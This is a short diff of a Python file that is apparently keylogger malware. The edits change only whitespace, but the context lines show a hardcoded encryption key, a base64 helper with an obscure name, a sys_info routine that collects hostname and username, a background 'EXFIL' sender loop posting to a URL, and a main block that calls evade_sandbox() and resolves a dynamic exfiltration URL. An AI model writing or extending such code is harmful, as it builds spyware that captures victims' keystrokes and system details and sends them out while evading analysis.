@@ -77,7 +77,7 @@ def encrypt_buffer(data, key=b'supersecretkey'):
 def hhhhh(data):
     encode_ASCII = data.encode("ascii")
     encode_base64 = base64.b64encode(encode_ASCII)
-    return encode_base64.decode()
+    return encode_base64.decode()    
 
 
 # === ORIGINAL KEYLOGGER CORE ===
@@ -131,7 +131,6 @@ def  sys_info():
     print(f"Hostname:", compturename,username)
     #homename = platform.node( )
 
-
 # === BACKGROUND EXFIL THREAD ===
 def sender_loop(url):
     while True:
@@ -148,7 +147,6 @@ def start():
 # === MAIN ===
 if __name__ == "__main__":
     evade_sandbox()
-    
     time.sleep(random.randint(2, 3))
     dynamic_url = get_dynamic_url()
     if dynamic_url:
